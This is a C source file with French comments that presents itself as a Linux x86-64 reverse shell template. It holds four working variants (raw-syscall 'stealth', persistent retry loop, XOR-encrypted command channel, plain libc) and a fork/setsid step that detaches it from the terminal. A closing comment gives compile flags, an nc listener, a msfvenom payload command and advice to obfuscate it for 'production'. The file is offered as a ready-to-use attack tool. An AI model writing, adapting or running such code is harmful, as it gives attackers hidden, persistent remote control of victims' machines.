/*
 * Template: Reverse Shell x64
 * Platform: Linux x86-64
 * Connexion vers attacker, spawn shell interactif
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Configuration
#define ATTACKER_IP   "127.0.0.1"
#define ATTACKER_PORT 4444

// Reverse shell avec syscalls directs (stealth)
void reverse_shell_syscalls(const char *ip, int port) {
    struct sockaddr_in sa;
    int sockfd;

    // socket(AF_INET, SOCK_STREAM, 0)
    asm volatile (
        "mov $41, %%rax\n"      // sys_socket
        "mov $2, %%rdi\n"       // AF_INET
        "mov $1, %%rsi\n"       // SOCK_STREAM
        "xor %%rdx, %%rdx\n"    // protocol = 0
        "syscall\n"
        "mov %%rax, %0"
        : "=r"(sockfd)
        :
        : "rax", "rdi", "rsi", "rdx", "rcx", "r11"
    );

    if (sockfd < 0) {
        return;
    }

    // Setup sockaddr_in
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);

    // connect(sockfd, &sa, sizeof(sa))
    asm volatile (
        "mov $42, %%rax\n"      // sys_connect
        "mov %0, %%rdi\n"       // sockfd
        "mov %1, %%rsi\n"       // &sa
        "mov $16, %%rdx\n"      // sizeof(sa)
        "syscall"
        :
        : "r"((long)sockfd), "r"(&sa)
        : "rax", "rdi", "rsi", "rdx", "rcx", "r11"
    );

    // dup2(sockfd, 0/1/2) - Rediriger stdin/stdout/stderr
    for (int i = 0; i < 3; i++) {
        asm volatile (
            "mov $33, %%rax\n"  // sys_dup2
            "mov %0, %%rdi\n"   // oldfd
            "mov %1, %%rsi\n"   // newfd
            "syscall"
            :
            : "r"((long)sockfd), "r"((long)i)
            : "rax", "rdi", "rsi", "rcx", "r11"
        );
    }

    // execve("/bin/sh", NULL, NULL)
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    asm volatile (
        "mov $59, %%rax\n"      // sys_execve
        "mov %0, %%rdi\n"       // filename
        "mov %1, %%rsi\n"       // argv
        "mov %2, %%rdx\n"       // envp
        "syscall"
        :
        : "r"(argv[0]), "r"(argv), "r"(envp)
        : "rax", "rdi", "rsi", "rdx"
    );
}

// Reverse shell avec fonctions libc (simple)
void reverse_shell_libc(const char *ip, int port) {
    struct sockaddr_in sa;
    int sockfd;

    // Créer socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return;
    }

    // Setup destination
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);

    // Connecter
    if (connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("connect");
        close(sockfd);
        return;
    }

    // Rediriger stdin/stdout/stderr vers socket
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    // Spawn shell
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
}

// Reverse shell avec persistance (retry)
void reverse_shell_persistent(const char *ip, int port) {
    while (1) {
        struct sockaddr_in sa;
        int sockfd;

        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            sleep(5);
            continue;
        }

        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr.s_addr = inet_addr(ip);

        if (connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
            close(sockfd);
            sleep(5);
            continue;
        }

        // Connexion réussie
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);

        char *argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);

        // Si execve échoue, retry
        close(sockfd);
        sleep(5);
    }
}

// Reverse shell avec chiffrement basique (XOR)
void reverse_shell_encrypted(const char *ip, int port, unsigned char key) {
    struct sockaddr_in sa;
    int sockfd;
    char buffer[4096];

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(ip);

    if (connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        close(sockfd);
        return;
    }

    // Loop: lire commande, exécuter, renvoyer résultat (tout chiffré)
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int n = recv(sockfd, buffer, sizeof(buffer) - 1, 0);
        if (n <= 0) break;

        // Déchiffrer commande
        for (int i = 0; i < n; i++) {
            buffer[i] ^= key;
        }

        // Exécuter commande via popen
        FILE *fp = popen(buffer, "r");
        if (fp) {
            memset(buffer, 0, sizeof(buffer));
            size_t total = 0;

            // Lire output
            while (total < sizeof(buffer) - 1) {
                size_t read = fread(buffer + total, 1, sizeof(buffer) - total - 1, fp);
                if (read == 0) break;
                total += read;
            }

            pclose(fp);

            // Chiffrer résultat
            for (size_t i = 0; i < total; i++) {
                buffer[i] ^= key;
            }

            // Envoyer
            send(sockfd, buffer, total, 0);
        }
    }

    close(sockfd);
}

int main(int argc, char *argv[]) {
    const char *ip = ATTACKER_IP;
    int port = ATTACKER_PORT;

    // Parse arguments (optionnel)
    if (argc >= 3) {
        ip = argv[1];
        port = atoi(argv[2]);
    }

    printf("[*] Reverse shell vers %s:%d\n", ip, port);

    // Daemonize (optionnel - se détacher du terminal)
    if (fork() != 0) {
        exit(0);  // Parent exit
    }

    setsid();  // Nouveau session leader

    // Choisir type de reverse shell
#ifdef STEALTH
    reverse_shell_syscalls(ip, port);
#elif defined(PERSISTENT)
    reverse_shell_persistent(ip, port);
#elif defined(ENCRYPTED)
    reverse_shell_encrypted(ip, port, 0xAA);  // XOR key = 0xAA
#else
    reverse_shell_libc(ip, port);
#endif

    return 0;
}

/*
 * Compilation:
 *   # Simple
 *   gcc reverse_shell.c -o reverse_shell
 *
 *   # Stealth (syscalls directs)
 *   gcc -DSTEALTH reverse_shell.c -o reverse_shell
 *
 *   # Persistent (retry connexion)
 *   gcc -DPERSISTENT reverse_shell.c -o reverse_shell
 *
 *   # Encrypted
 *   gcc -DENCRYPTED reverse_shell.c -o reverse_shell
 *
 *   # Statique (pas de dépendances)
 *   gcc reverse_shell.c -o reverse_shell -static
 *
 *   # Stripping (reduce size)
 *   gcc reverse_shell.c -o reverse_shell -s
 *
 * Usage:
 *   # Attacker (listener)
 *   nc -lvp 4444
 *
 *   # Target (reverse shell)
 *   ./reverse_shell [ip] [port]
 *
 * Shellcode extraction:
 *   msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
 *
 * Notes:
 *   - Modifier IP/PORT avant compilation ou passer en args
 *   - Daemonize pour se détacher du terminal
 *   - Version ENCRYPTED nécessite handler custom côté attacker
 *   - Pour production: obfusquer strings, encoder binaire, etc.
 */
